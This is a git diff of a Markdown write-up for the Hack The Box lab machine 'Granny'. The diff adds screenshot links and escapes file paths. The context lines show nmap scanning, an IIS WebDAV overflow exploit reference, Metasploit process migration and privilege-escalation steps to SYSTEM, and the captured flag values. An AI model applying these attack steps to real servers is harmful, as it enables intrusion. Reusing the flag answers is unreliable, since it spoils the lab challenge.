@@ -14,6 +14,7 @@
 ```bash
 nmap -sV -sC -oA nmap/Granny 10.129.95.234
 ```
+![nmap](img/nmap.png)
 
 **Open Ports:**
 ```
@@ -33,6 +34,7 @@ nmap -sV -sC -oA nmap/Granny 10.129.95.234
 
 - Exploit Title: Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overflow (Metasploit)
 - ExploitDB: [41992](https://www.exploit-db.com/exploits/41992)
+![exploitdb](img/exploitdb.png)
 
 ### 🎯 Exploitation (Metasploit)
 
@@ -59,6 +61,7 @@ migrate 1956  # wmiprvse.exe (NT AUTHORITY\NETWORK SERVICE)
 getuid
 # NT AUTHORITY\NETWORK SERVICE
 ```
+![migrate](img/migrate.png)
 
 ---
 
@@ -72,6 +75,7 @@ use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
 ```
+![recon](img/recon.png)
 
 **Notable Exploit Candidates:**
 - `ms15_051_client_copy_image`
@@ -86,6 +90,7 @@ run
 getuid
 # NT AUTHORITY\SYSTEM
 ```
+![system_privilege](img/system_privilege.png)
 
 ✅ SYSTEM Shell acquired
 
@@ -94,16 +99,18 @@ getuid
 ## 🏁 Flags
 
 ### 👤 User Flag
+![userflag](img/userflag.png)
 
 ```bash
-cat C:\Documents and Settings\[USERNAME]\Desktop\user.txt
+cat C:\\Documents and Settings\\[USERNAME]\\Desktop\\user.txt
 700c5dc163014e22b3e408f8703f67d1
 ```
 
 ### 👑 Root Flag
+![rootflag](img/rootflag.png)
 
 ```bash
-cat C:\Documents and Settings\Administrator\Desktop\root.txt
+cat C:\\Documents and Settings\\Administrator\\Desktop\\root.txt
 aa4beed1c0584445ab463a6747bd06e9
 ```
 
